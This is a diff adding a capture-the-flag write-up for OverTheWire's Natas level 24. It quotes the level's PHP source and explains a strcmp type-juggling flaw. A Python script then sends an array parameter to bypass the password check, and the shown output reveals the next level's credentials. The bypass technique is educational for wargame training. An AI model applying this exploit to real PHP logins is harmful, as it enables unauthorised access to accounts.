@@ -2976,4 +2976,134 @@ URL: http://natas24.natas.labs.overthewire.org
 
 ### Message
 
+The page requests a password.
+
+### Solution
+
+We are given the source:
+
+```html
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas24", "pass": "<censored>" };</script></head>
+<body>
+<h1>natas24</h1>
+<div id="content">
+
+Password:
+<form name="input" method="get">
+    <input type="text" name="passwd" size=20>
+    <input type="submit" value="Login">
+</form>
+
+<?php
+    if(array_key_exists("passwd",$_REQUEST)){
+        if(!strcmp($_REQUEST["passwd"],"<censored>")){
+            echo "<br>The credentials for the next level are:<br>";
+            echo "<pre>Username: natas25 Password: <censored></pre>";
+        }
+        else{
+            echo "<br>Wrong!<br>";
+        }
+    }
+    // morla / 10111
+?>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+Ok, first thought: we must brute-force. This is going to take like forever...
+
+Hold on, think more. Read more about the function `strcmp`.
+
+Interestingly, we find in [the documentation](https://www.php.net/manual/en/function.strcmp.php) for `strcmp`:
+
+> If you rely on strcmp for safe string comparisons, both parameters must be strings, the result is otherwise extremely unpredictable.
+> For instance you may get an unexpected 0, or return values of NULL, -2, 2, 3 and -3.
+
+Interestingly:
+
+```
+strcmp("foo", array()) => NULL + PHP Warning
+```
+
+The script:
+
+```python
+import requests
+from requests.auth import HTTPBasicAuth
+
+basic_auth = HTTPBasicAuth('natas24', 'MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd')
+
+url = "http://natas24.natas.labs.overthewire.org/index.php"
+
+
+def send_request(url) -> str:
+    print(f"Sending request to [{url}]...")
+    headers = {'Content-Type': 'text/html; charset=UTF-8'}
+    response = requests.get(url,
+                            headers=headers,
+                            auth=basic_auth,
+                            verify=False)
+    return response.text
+
+
+if __name__ == '__main__':
+    text = send_request(url + f"?passwd[]=asd")
+    print(text)
+```
+
+gives us:
+
+```bash
+$ python natas24.py
+Sending request to [http://natas24.natas.labs.overthewire.org/index.php?passwd[]=asd]...
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src="http://natas.labs.overthewire.org/js/wechall-data.js"></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas24", "pass": "MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd" };</script></head>
+<body>
+<h1>natas24</h1>
+<div id="content">
+
+Password:
+<form name="input" method="get">
+    <input type="text" name="passwd" size=20>
+    <input type="submit" value="Login">
+</form>
+
+<br />
+<b>Warning</b>:  strcmp() expects parameter 1 to be string, array given in <b>/var/www/natas/natas24/index.php</b> on line <b>23</b><br />
+<br>The credentials for the next level are:<br><pre>Username: natas25 Password: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws</pre>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+## Natas 25
+
+### Credentials
+
+Username: natas25
+Password: ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws
+URL: http://natas25.natas.labs.overthewire.org
+
+### Message
+
 ### Solution
